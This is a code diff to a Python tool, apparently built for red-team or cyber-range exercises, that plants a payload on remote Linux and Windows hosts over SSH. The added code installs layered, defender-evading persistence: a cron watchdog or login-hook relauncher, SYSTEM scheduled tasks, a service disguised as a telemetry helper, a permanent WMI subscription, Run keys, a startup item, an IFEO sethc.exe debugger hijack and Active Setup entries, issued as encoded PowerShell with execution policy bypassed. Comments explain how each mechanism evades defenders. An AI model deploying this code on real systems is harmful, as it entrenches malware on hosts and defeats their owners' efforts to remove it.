@@ -41,6 +41,11 @@ WINDOWS_LAUNCHERS = ("task_onstart", "task_onlogon", "task_daily", "service",
                      "wmi", "run_key", "startup", "active_setup")
 WINDOWS_REDUNDANCY = ("run_key", "startup", "ifeo", "active_setup", "wmi")
 
+# Linux gets the same treatment: the systemd unit is the primary surface and
+# one redundant surface is drawn alongside it, so killing the unit does not
+# end the channel.
+LINUX_REDUNDANCY = ("cron_watch", "profile_hook")
+
 
 
 def manifest_path(comp_dir):
@@ -207,11 +212,70 @@ class Planter:
                                        key_path=fh.get("key_path"))
         active = (out or "").strip().splitlines()[-1:] == ["active"]
         ok = rc == 0 and active
-        return {"ok": ok,
-                "detail": (f"{unit} active on {ip} (transport {transport})" if ok
-                           else f"unit install rc={rc}: {(err or out).strip()[:200]}"),
-                "unit": unit, "paths": [remote, f"/etc/systemd/system/{unit}"],
+        if not ok:
+            return {"ok": False,
+                    "detail": f"unit install rc={rc}: {(err or out).strip()[:200]}",
+                    "unit": unit, "paths": [remote, f"/etc/systemd/system/{unit}"],
+                    "check_cmd": f"systemctl is-active {unit}"}
+        mech, extra_paths, extra_undo, note = self._linux_redundant(
+            ip, fh, names_drawn, remote, stage)
+        undo = ([f"systemctl disable --now {unit}",
+                 f"rm -f {remote} /etc/systemd/system/{unit}"] + extra_undo)
+        return {"ok": True,
+                "detail": (f"{unit} active on {ip} (transport {transport}); {note}"
+                           if note else f"{unit} active on {ip} (transport {transport})"),
+                "unit": unit, "paths": [remote, f"/etc/systemd/system/{unit}"] + extra_paths,
+                "mechanisms": ["systemd"] + mech,
+                "undo": undo,
                 "check_cmd": f"systemctl is-active {unit}"}
+
+    def _linux_redundant(self, ip, fh, drawn, remote, stage):
+        """One persistence surface beyond the systemd unit.
+
+        A lone unit is the first thing a defender greps for. A cron file (boot +
+        a 17-minute watchdog) or a login hook brings the agent back after the
+        unit is killed, and blue has to sweep a second location. Best effort: the
+        unit is the primary surface, so this only ever adds a note.
+        """
+        from ..effects.base import root_cmd        # lazy: avoids a cycle
+        mech = self.ctx.rng.choice(LINUX_REDUNDANCY)
+        stem = drawn["stem"]
+        if mech == "cron_watch":
+            path = f"/etc/cron.d/{stem}"
+            body = (f"@reboot root {remote} >/dev/null 2>&1\n"
+                    f'*/17 * * * * root pgrep -f "{remote}" >/dev/null 2>&1 '
+                    f"|| {remote} >/dev/null 2>&1\n")
+        else:
+            path = f"/etc/profile.d/{stem}.sh"
+            body = (f'# {drawn["unit_desc"]}\n'
+                    f'pgrep -f "{remote}" >/dev/null 2>&1 '
+                    f"|| {{ setsid {remote} >/dev/null 2>&1 & }}\n")
+        staged = f"{stage}/{Path(path).name}"
+        local = None
+        try:
+            fd, local = tempfile.mkstemp(prefix="tlaloc-extra-", suffix=".txt")
+            with os.fdopen(fd, "w", encoding="utf-8") as handle:
+                handle.write(body)
+            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", local,
+                                  staged, mode=0o644, key_path=fh.get("key_path"))
+            restart = ("systemctl try-restart cron 2>/dev/null "
+                       "|| service cron restart 2>/dev/null || true"
+                       if mech == "cron_watch" else "true")
+            rc, out, err = self.ctx.ssh.ssh(
+                ip, fh["user"], fh.get("password") or "",
+                root_cmd(f"mv {staged} {path} && chmod 644 {path}", fh) + "\n" + restart,
+                timeout=90, key_path=fh.get("key_path"))
+            undo = [f"rm -f {path}"]
+            if mech == "cron_watch":
+                undo.append("systemctl try-restart cron 2>/dev/null || true")
+            return ([mech], [path], undo,
+                    f"{mech} at {path} rc={rc}" if rc == 0
+                    else f"{mech} rc={rc}: {(err or out).strip()[:120]}")
+        except Exception as exc:                       # redundancy is optional
+            return [], [], [], f"{mech} failed: {exc}"
+        finally:
+            if local and os.path.exists(local):
+                os.unlink(local)
 
     def _install_windows(self, ip, box_id, local, transport, wait_sec=120):
         """Plant the frozen payload through a mix of Windows mechanisms.
@@ -250,10 +314,13 @@ class Planter:
             return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                     "paths": [remote]}
 
+        exe = Path(staged).name
+        guard = (f'cmd /c tasklist /FI "IMAGENAME eq {exe}" | find /I "{exe}" >nul '
+                 f'|| start "" /b "{remote}"')
         undo, artifacts, notes = [], [], []
         chosen = []
         for mechanism in [launcher] + redundant:
-            spec = WINDOWS_MECHANISMS[mechanism](self, ip, fh, drawn, remote)
+            spec = WINDOWS_MECHANISMS[mechanism](self, ip, fh, drawn, remote, guard)
             chosen.append(mechanism)
             notes.append(f"{mechanism}: {spec['detail']}")
             undo.extend(spec["undo"])
@@ -280,6 +347,18 @@ class Planter:
 
     # -- windows mechanism helpers -------------------------------------------
 
+    def _win_ps(self, ip, fh, body, timeout=120):
+        """Run a PowerShell snippet, base64-encoded so no shell layer mangles it.
+
+        Registering a registry value or a WMI consumer with embedded quotes
+        through `cmd /c` lost the value silently (reg add answered 0, the key
+        was never written). -EncodedCommand is a single token: nothing to quote.
+        """
+        import base64
+        blob = base64.b64encode(body.encode("utf-16-le")).decode()
+        return self._win(ip, fh, f"powershell -NoProfile -ExecutionPolicy Bypass "
+                                 f"-EncodedCommand {blob}", timeout=timeout)
+
     def _win(self, ip, fh, command, timeout=120):
         """Run one cmd/powershell line on a Windows box over its SSH channel."""
         return self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", command,
@@ -290,7 +369,7 @@ class Planter:
             ip, fh, f'tasklist /FI "IMAGENAME eq {image}"', timeout=60)
         return image.lower() in (out or "").lower()
 
-    def _mech_task(self, ip, fh, drawn, remote, *, trigger):
+    def _mech_task(self, ip, fh, drawn, remote, guard=None, *, trigger):
         task = drawn["task"]
         script = (f'schtasks /Create /TN "{task}" /TR "{remote}" /SC {trigger} '
                   f'/RU SYSTEM /RL HIGHEST /F'
@@ -301,13 +380,15 @@ class Planter:
                 "undo": [f'schtasks /End /TN "{task}"',
                          f'schtasks /Delete /TN "{task}" /F']}
 
-    def _mech_task_onstart(self, ip, fh, drawn, remote):
+    # A task's /TR is the bare exe path (schtasks mangles a piped command line),
+    # so the task builders take `guard` for signature parity and do not use it.
+    def _mech_task_onstart(self, ip, fh, drawn, remote, guard):
         return self._mech_task(ip, fh, drawn, remote, trigger="ONSTART")
 
-    def _mech_task_onlogon(self, ip, fh, drawn, remote):
+    def _mech_task_onlogon(self, ip, fh, drawn, remote, guard):
         return self._mech_task(ip, fh, drawn, remote, trigger="ONLOGON")
 
-    def _mech_task_daily(self, ip, fh, drawn, remote):
+    def _mech_task_daily(self, ip, fh, drawn, remote, guard):
         # A recurring trigger with a random minute: the agent comes back every
         # hour without a boot and without a logon.
         minute = self.ctx.rng.randrange(1, 60)
@@ -320,12 +401,12 @@ class Planter:
                 "undo": [f'schtasks /End /TN "{task}"',
                          f'schtasks /Delete /TN "{task}" /F']}
 
-    def _mech_service(self, ip, fh, drawn, remote):
+    def _mech_service(self, ip, fh, drawn, remote, guard):
         # A console agent cannot be an SCM service (1053), so the service runs a
         # detached launcher; the service entry is the persistence, the child is
         # the agent. `sc failure` makes a stopped launcher restart itself.
         svc = drawn["service"]
-        script = (f'sc create "{svc}" binPath= "cmd /c start \\"\\" /b {remote}" '
+        script = (f'sc create "{svc}" binPath= "{guard}" '
                   f'start= auto && sc description "{svc}" "Windows telemetry helper" && '
                   f'sc failure "{svc}" reset= 0 actions= restart/60000 && sc start "{svc}"')
         rc, out, err = self._win(ip, fh, script, timeout=180)
@@ -333,74 +414,81 @@ class Planter:
                 "paths": [f"service:{svc}"],
                 "undo": [f'sc stop "{svc}"', f'sc delete "{svc}"']}
 
-    def _mech_wmi(self, ip, fh, drawn, remote):
+    def _mech_wmi(self, ip, fh, drawn, remote, guard):
+        # Permanent WMI subscription: no file on disk in a startup location, no
+        # task, no service — blue has to enumerate root\subscription to see it.
         name = drawn["wmi"]
-        ps = (
-            "powershell -NoProfile -Command \""
+        body = (
             f"$f = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter "
             f"-Arguments @{{Name='{name}'; EventNamespace='root\\cimv2'; "
-            f"QueryLanguage='WQL'; Query=\\\"SELECT * FROM __InstanceModificationEvent "
-            f"WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\\\"}}; "
+            f"QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent "
+            f"WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}}; "
             f"$c = Set-WmiInstance -Namespace root\\subscription -Class "
             f"CommandLineEventConsumer -Arguments @{{Name='{name}'; "
-            f"CommandLineTemplate='{remote}'; ExecutablePath='{remote}'}}; "
+            f"CommandLineTemplate='{guard}'; ExecutablePath='cmd.exe'}}; "
             "Set-WmiInstance -Namespace root\\subscription -Class "
-            "__FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c} | Out-Null\"")
-        rc, out, err = self._win(ip, fh, ps, timeout=180)
+            "__FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c} | Out-Null")
+        rc, out, err = self._win_ps(ip, fh, body, timeout=180)
         return {"detail": f"WMI subscription {name} rc={rc}",
                 "paths": [f"wmi:{name}"],
-                "undo": ["powershell -NoProfile -Command \"Get-WmiObject -Namespace "
-                         "root\\subscription -Class __FilterToConsumerBinding | "
-                         f"Where-Object {{ $_.Consumer -match '{name}' }} | Remove-WmiObject; "
-                         "Get-WmiObject -Namespace root\\subscription -Class "
-                         f"__EventFilter | Where-Object {{ $_.Name -eq '{name}' }} | Remove-WmiObject; "
-                         "Get-WmiObject -Namespace root\\subscription -Class "
-                         "CommandLineEventConsumer | "
-                         f"Where-Object {{ $_.Name -eq '{name}' }} | Remove-WmiObject\""]}
+                "undo": [f"Get-WmiObject -Namespace root\\subscription -Class "
+                         f"__FilterToConsumerBinding | Where-Object {{ "
+                         f"$_.Consumer -match '{name}' }} | Remove-WmiObject; "
+                         f"Get-WmiObject -Namespace root\\subscription -Class "
+                         f"__EventFilter | Where-Object {{ $_.Name -eq '{name}' }} | "
+                         f"Remove-WmiObject; Get-WmiObject -Namespace root\\subscription "
+                         f"-Class CommandLineEventConsumer | Where-Object {{ "
+                         f"$_.Name -eq '{name}' }} | Remove-WmiObject"]}
 
-    def _mech_run_key(self, ip, fh, drawn, remote):
+    def _mech_run_key(self, ip, fh, drawn, remote, guard):
         value = drawn["run_value"]
-        rc, out, err = self._win(
-            ip, fh, f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
-                    f'/v "{value}" /t REG_SZ /d "{remote}" /f', timeout=90)
+        rc, out, err = self._win_ps(
+            ip, fh, f"Set-ItemProperty -LiteralPath "
+                    f"'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
+                    f"-Name '{value}' -Value '{guard}' -Force", timeout=90)
         return {"detail": f"HKLM Run value {value} rc={rc}",
                 "paths": [f"registry:HKLM\\...\\Run\\{value}"],
                 "undo": [f'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion'
                          f'\\Run" /v "{value}" /f']}
 
-    def _mech_startup(self, ip, fh, drawn, remote):
+    def _mech_startup(self, ip, fh, drawn, remote, guard):
         name = drawn["run_value"]
         cmd = f"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.cmd"
-        body = f'start "" /b "{remote}"'
-        ps = (f'powershell -NoProfile -Command "Set-Content -Path \'C:\\ProgramData'
-              f'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.cmd\' '
-              f'-Value \'{body}\' -Encoding ascii"')
-        rc, out, err = self._win(ip, fh, ps, timeout=90)
+        body = guard[len("cmd /c "):]
+        rc, out, err = self._win_ps(
+            ip, fh, f"Set-Content -LiteralPath 'C:\\ProgramData\\Microsoft\\Windows"
+                    f"\\Start Menu\\Programs\\Startup\\{name}.cmd' -Value '{body}' "
+                    f"-Encoding ascii", timeout=90)
         return {"detail": f"startup item {name}.cmd rc={rc}",
                 "paths": [cmd],
                 "undo": [f'Remove-Item -Path \'{cmd}\' -Force']}
 
-    def _mech_ifeo(self, ip, fh, drawn, remote):
+    def _mech_ifeo(self, ip, fh, drawn, remote, guard):
         # Debugger hijack on an accessibility binary: the payload starts as SYSTEM
         # at the logon screen (shift x5), a surface almost nobody checks.
         target = "sethc.exe"
         key = (f"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File "
                f"Execution Options\\{target}")
-        rc, out, err = self._win(
-            ip, fh, f'reg add "{key}" /v Debugger /t REG_SZ /d "{remote}" /f', timeout=90)
+        rc, out, err = self._win_ps(
+            ip, fh, f"New-Item -Path '{key}' -Force | Out-Null; "
+                    f"Set-ItemProperty -LiteralPath '{key}' -Name Debugger "
+                    f"-Value '{remote}' -Force", timeout=90)
         return {"detail": f"IFEO debugger on {target} rc={rc}",
                 "paths": [f"registry:{key}\\Debugger"],
                 "undo": [f'reg delete "{key}" /v Debugger /f']}
 
-    def _mech_active_setup(self, ip, fh, drawn, remote):
+    def _mech_active_setup(self, ip, fh, drawn, remote, guard):
         rng = self.ctx.rng
         hex8 = lambda n: "".join(f"{rng.randrange(16):x}" for _ in range(n))
         guid = f"{{{hex8(8)}-{hex8(4)}-{hex8(4)}-{hex8(4)}-{hex8(12)}}}"
         key = (f"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{guid}")
-        stub = f'cmd /c start "" /b "{remote}"'
-        script = (f'reg add "{key}" /v StubPath /t REG_SZ /d "{stub}" /f && '
-                  f'reg add "{key}" /v Version /t REG_SZ /d "1,0,0,0" /f')
-        rc, out, err = self._win(ip, fh, script, timeout=90)
+        stub = guard
+        rc, out, err = self._win_ps(
+            ip, fh, f"New-Item -Path '{key}' -Force | Out-Null; "
+                    f"Set-ItemProperty -LiteralPath '{key}' -Name StubPath "
+                    f"-Value '{stub}' -Force; "
+                    f"Set-ItemProperty -LiteralPath '{key}' -Name Version "
+                    f"-Value '1,0,0,0' -Force", timeout=90)
         return {"detail": f"Active Setup {guid} rc={rc}",
                 "paths": [f"registry:{key}"],
                 "undo": [f'reg delete "{key}" /f']}
